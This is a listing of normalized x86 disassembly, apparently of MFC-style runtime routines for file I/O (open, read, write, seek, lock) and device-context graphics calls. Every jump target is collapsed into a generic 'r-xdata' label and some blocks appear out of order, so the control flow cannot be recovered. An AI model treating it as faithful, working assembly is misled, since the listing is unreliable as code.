test edi edi
je r-xdata
push esi
mov esi [ GetCurrentProcess@IAT ]
push 0x2
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
push eax
call esi
push eax
push [ ebx + 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
pop esi
jne r-xdata
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_424179
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x4 ]
sub_423a54
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0xc ]
and [ esi + 0x8 ] 0x0
or [ esi + 0x4 ] 0xffffffff
lea ebx [ esi + 0xc ]
and edi 0xffff7fff
mov ecx ebx
call sub_422403
push [ ebp + 0x8 ]
lea eax [ ebp - 0x110 ]
push eax
call sub_423d80
lea eax [ ebp - 0x110 ]
mov ecx ebx
push eax
call sub_422601
mov eax edi
xor ecx ecx
and eax 0x3
sub eax ecx
je r-xdata
mov ecx 0x80000000
dec eax
je r-xdata
xor eax eax
cmp eax 0x10
je r-xdata
mov ecx 0x40000000
jmp r-xdata
dec eax
jne r-xdata
push 0x3
pop edi
and edi 0x2000
neg edi
sbb edi edi
and edi 0x2
inc edi
inc edi
jmp r-xdata
cmp eax 0x20
je r-xdata
mov eax edi
push 0x1
and eax 0x70
pop ebx
je r-xdata
mov ecx 0xc0000000
jmp r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov eax ebx
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
push 0x0
push 0x80
lea edx [ ebp - 0xc ]
push edi
push edx
push eax
push ecx
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x30
je r-xdata
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
mov [ esi + 0xc ] eax
call sub_4242a5
push [ ebp + 0x8 ]
lea ecx [ esi + 0x10 ]
mov [ esi + 0x8 ] eax
call sub_422601
and [ ebp - 0x8 ] 0x0
mov edx edi
not edx
shr edx 0x7
and edx ebx
mov [ ebp - 0xc ] 0xc
test edi 0x1000
mov [ ebp - 0x4 ] edx
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
pop eax
jmp r-xdata
push 0x3
sub_423b71
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
lea eax [ ebp + 0xc ]
push 0x0
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call [ GetLastError@IAT ]
push eax
call sub_424179
pop ebp
retn 0x8
sub_423bab
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ ebp + 0xc ]
push 0x0
push eax
push edi
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_424179
push [ esi + 0xc ]
push 0xffffffff
push 0xd
call sub_42423a
sub_423bf6
push esi
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn 0x8
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_424179
sub_423c25
push esi
push 0x1
push 0x0
push 0x0
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_424179
sub_423c6f
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
or [ esi + 0x4 ] 0xffffffff
and [ esi + 0x8 ] 0x0
lea ecx [ esi + 0xc ]
call sub_422403
test edi edi
pop edi
pop esi
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov edi eax
neg edi
sbb edi edi
inc edi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_424179
sub_423cd0
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ LockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_424179
sub_423cf9
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ UnlockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_424179
sub_423d22
push esi
mov esi ecx
push 0x0
mov eax [ esi ]
push [ esp + 0xc ]
call [ eax + 0x28 ]
push [ esi + 0x4 ]
call [ SetEndOfFile@IAT ]
test eax eax
pop esi
jne r-xdata
retn 0x4
push eax
call [ GetLastError@IAT ]
push eax
call sub_424179
sub_423d4e
push ebx
push esi
mov esi ecx
push edi
push 0x1
push 0x0
mov eax [ esi ]
call [ eax + 0x28 ]
mov edi eax
mov eax [ esi ]
push 0x2
push 0x0
mov ecx esi
call [ eax + 0x28 ]
mov ebx eax
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x28 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
sub_423d80
mov eax sub_42b3a8
call sub_410a78
sub esp 0x14c
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
mov esi 0x104
push edi
push esi
push [ ebp + 0xc ]
call [ GetFullPathNameA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
xor esi esi
push eax
push edi
mov [ ebp - 0x4 ] esi
call sub_423e50
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push esi
push esi
push [ ebp + 0x8 ]
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0xc ]
push edi
call [ lstrcpynA@IAT ]
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_422478
mov eax esi
test [ ebp - 0x10 ] 0x2
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
test [ ebp - 0x10 ] 0x4
jne r-xdata
push edi
call [ CharUpperA@IAT ]
push 0x1
pop esi
lea eax [ ebp - 0x158 ]
push eax
push [ ebp + 0xc ]
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x12c ]
push eax
push [ ebp - 0x14 ]
call [ lstrcpyA@IAT ]
sub_423e50
mov ecx [ esp + 0x8 ]
push ebx
push esi
mov esi 0x104
push edi
push esi
call sub_422745
xor ebx ebx
mov edi eax
push esi
push ebx
push edi
call sub_410a20
add esp 0xc
push esi
push [ esp + 0x14 ]
push edi
call [ lstrcpynA@IAT ]
mov cl [ edi ]
mov eax edi
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
mov cl [ edi ]
mov eax edi
inc eax
inc eax
mov cl [ eax + 0x1 ]
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
jne r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
je r-xdata
push eax
call sub_41155f
pop ecx
mov cl [ eax ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0xffffffff
call sub_422794
pop edi
pop esi
pop ebx
retn 0x8
mov [ eax + 0x1 ] bl
cmp cl 0x2f
je r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
push eax
call sub_41155f
pop ecx
cmp cl 0x2f
je r-xdata
cmp cl bl
je r-xdata
push eax
call sub_41155f
pop ecx
mov cl [ eax ]
jmp r-xdata
cmp cl 0x5c
je r-xdata
push eax
call sub_41155f
pop ecx
jmp r-xdata
cmp cl bl
je r-xdata
cmp cl 0x2f
jne r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
sub_423f16
push ebp
mov ebp esp
sub esp 0x104
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
mov esi edi
jne r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call GetFileTitleA
test ax ax
je r-xdata
lea esi [ ebp - 0x104 ]
mov [ ebp + 0x10 ] 0x104
test edi edi
jne r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_427f97
jmp r-xdata
xor eax eax
push esi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_423f6c
mov eax sub_42b4c3
call sub_410a78
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_42409f
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_422745
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_427f97
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_422794
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4221ed
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_422478
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_423fee
mov eax sub_42b4ef
call sub_410a78
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_42409f
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_422745
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_423f16
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_422794
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4221ed
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_422478
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_424070
push ebp
mov ebp esp
sub esp 0x11c
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x11c ]
push eax
call sub_42409f
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10a ]
push eax
call sub_4224e6
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_42409f
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x118
push 0x0
mov edi ecx
push esi
call sub_410a20
add esp 0xc
lea eax [ esi + 0x12 ]
push 0x104
push [ edi + 0xc ]
push eax
call [ lstrcpynA@IAT ]
mov eax [ edi + 0x4 ]
or ebx 0xffffffff
cmp eax ebx
je r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ edi + 0x4 ]
call [ GetFileSize@IAT ]
cmp eax ebx
mov [ esi + 0xc ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ edi + 0xc ]
cmp [ edi - 0x8 ] 0x0
jne r-xdata
push edi
call [ GetFileAttributesA@IAT ]
cmp eax ebx
je r-xdata
and [ esi + 0x10 ] 0x0
jmp r-xdata
mov [ esi + 0x10 ] al
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea ecx [ ebp + 0x8 ]
call sub_41dcf0
mov eax [ eax ]
push ebx
mov [ esi ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_41dcf0
mov eax [ eax ]
push ebx
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_41dcf0
mov eax [ eax ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
sub_42419a
mov eax sub_42b50c
call sub_410a78
push ecx
mov eax [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
test eax eax
mov edi 0xf1a0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x10 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_4221ed
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx edi
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
add eax edi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_425cad
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x10 ]
call sub_422478
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_422478
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_423897
sub_42423a
mov eax sub_42b534
call sub_410a78
push ecx
push ecx
push esi
push 0x14
call sub_4221b9
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_423042
mov eax [ rw-data ]
lea ecx [ esi + 0x10 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0xc ] eax
call sub_422601
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x10 ] esi
call sub_410a97
pop esi
sub_4242a5
mov eax [ esp + 0x4 ]
mov ecx 0x10b
cmp eax ecx
ja r-xdata
sub eax 0x3e3
je r-xdata
je r-xdata
push 0xa
dec eax
je r-xdata
push 0x3
jmp r-xdata
cmp eax 0x3e
ja r-xdata
dec eax
je r-xdata
pop eax
cmp eax 0x6b
ja r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
mov ecx 0x90
cmp eax ecx
ja r-xdata
je r-xdata
push 0x8
jmp r-xdata
cmp eax 0x19
ja r-xdata
push 0x5
jmp r-xdata
push 0x1
jmp r-xdata
mov ecx 0xb6
cmp eax ecx
ja r-xdata
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x47
ja r-xdata
cmp eax 0x27
ja r-xdata
je r-xdata
sub eax 0xb7
je r-xdata
je r-xdata
cmp eax 0x75
ja r-xdata
sub eax 0x50
je r-xdata
je r-xdata
add eax 0xffffffcc
cmp eax 0x8
ja r-xdata
je r-xdata
push 0x9
jmp r-xdata
cmp eax 0x18
ja r-xdata
sub eax 0x8
je r-xdata
push 0x6
jmp r-xdata
sub eax 0x91
je r-xdata
sub eax 0x7b
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
sub eax 0x40
je r-xdata
jmp [ eax * 4 + jump_table_4244ff ]
push 0xd
jmp r-xdata
cmp eax 0x20
ja r-xdata
jmp [ eax * 4 + jump_table_42449b ]
dec eax
dec eax
je r-xdata
push 0x7
jmp r-xdata
sub eax 0x9
je r-xdata
dec eax
je r-xdata
sub eax 0x6c
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
sub eax 0x21
je r-xdata
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0xd
je r-xdata
sub eax 0x7
je r-xdata
dec eax
je r-xdata
push 0xc
jmp r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
push 0xb
jmp r-xdata
sub eax 0x1a
je r-xdata
retn 0x4
dec eax
dec eax
jne r-xdata
sub eax 0x6
je r-xdata
sub eax 0x6
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
dec eax
je r-xdata
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
dec eax
je r-xdata
jmp r-xdata
dec eax
jne r-xdata
dec eax
jne r-xdata
jmp r-xdata
push 0xe
jmp r-xdata
sub_424523
push ebx
push esi
push edi
or ebx 0xffffffff
call sub_4229ff
mov esi eax
call sub_4272f7
push [ esp + 0x1c ]
mov edi [ eax + 0x4 ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call sub_427e17
test eax eax
je r-xdata
call sub_429dde
pop edi
mov eax ebx
pop esi
pop ebx
retn 0x10
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x84 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x54 ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x68 ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ebx eax
sub_4245dc
mov eax sub_42ac66
call sub_410a78
push esi
call sub_42731d
mov esi eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x1c ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_425036
call sub_4221a7
push 0x48
mov ebx eax
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x2
push 0x4
push r--data
call sub_42358d
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x1c ] eax
call sub_4221a7
pop ebx
sub_424663
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push 0x1
call sub_4245dc
push edi
lea ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] edi
call sub_41e529
mov [ eax ] esi
mov eax [ esi ]
push [ esi + 0x4 ]
mov ecx esi
call [ eax + 0xc ]
push 0x1
pop eax
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_42469a
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4245dc
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_41e579
sub_4246cb
mov eax sub_42ac78
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_42469a
push eax
call [ DeleteDC@IAT ]
sub_42471f
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi [ SaveDC@IAT ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push eax
call edi
mov ebx eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
push eax
call edi
test eax eax
je r-xdata
or ebx 0xffffffff
sub_424750
push esi
mov esi ecx
push edi
mov edi [ RestoreDC@IAT ]
mov ecx [ esi + 0x4 ]
push 0x1
cmp ecx [ esi + 0x8 ]
pop eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
xor eax eax
push [ esp + 0xc ]
push esi
call edi
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
sub_42478e
push ebx
push esi
push edi
mov esi ecx
push [ esp + 0x10 ]
call [ GetStockObject@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
xor eax eax
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push ebx
push ecx
call edi
push eax
call sub_424df1
pop edi
pop esi
pop ebx
retn 0x4
push ebx
push esi
call edi
sub_4247ca
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_424df1
pop edi
pop esi
pop ebx
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_424810
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetBkColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_42483f
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetTextColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_42486e
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetMapMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_42489c
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4248e8
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ OffsetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_424934
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_424980
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4249d8
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_424a24
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_424a8c
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x8 ]
push edi
mov esi ecx
push eax
push [ esi + 0x8 ]
call [ GetWindowExtEx@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x8 ]
call [ GetViewportExtEx@IAT ]
push [ ebp - 0x8 ]
call sub_411524
pop ecx
push eax
push [ ebp - 0x10 ]
call sub_411524
mov esi [ ebp + 0x8 ]
mov edi [ MulDiv@IAT ]
pop ecx
push eax
push [ esi ]
call edi
push [ ebp - 0x4 ]
mov [ esi ] eax
call sub_411524
pop ecx
push eax
push [ ebp - 0xc ]
call sub_411524
pop ecx
push eax
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
pop edi
pop esi
leave
retn 0x4
sub_424af5
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
push [ esi + 0x8 ]
call [ GetWindowExtEx@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x8 ]
call [ GetViewportExtEx@IAT ]
push [ ebp - 0x8 ]
call sub_411524
pop ecx
push eax
push [ ebp - 0x10 ]
call sub_411524
mov esi [ ebp + 0x8 ]
mov edi [ MulDiv@IAT ]
pop ecx
push eax
push [ esi ]
call edi
push [ ebp - 0x4 ]
mov [ esi ] eax
call sub_411524
pop ecx
push eax
push [ ebp - 0xc ]
call sub_411524
pop ecx
push eax
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
pop edi
pop esi
leave
retn 0x4
sub_424b5e
mov eax sub_42ac8c
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_4245ac
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
test eax eax
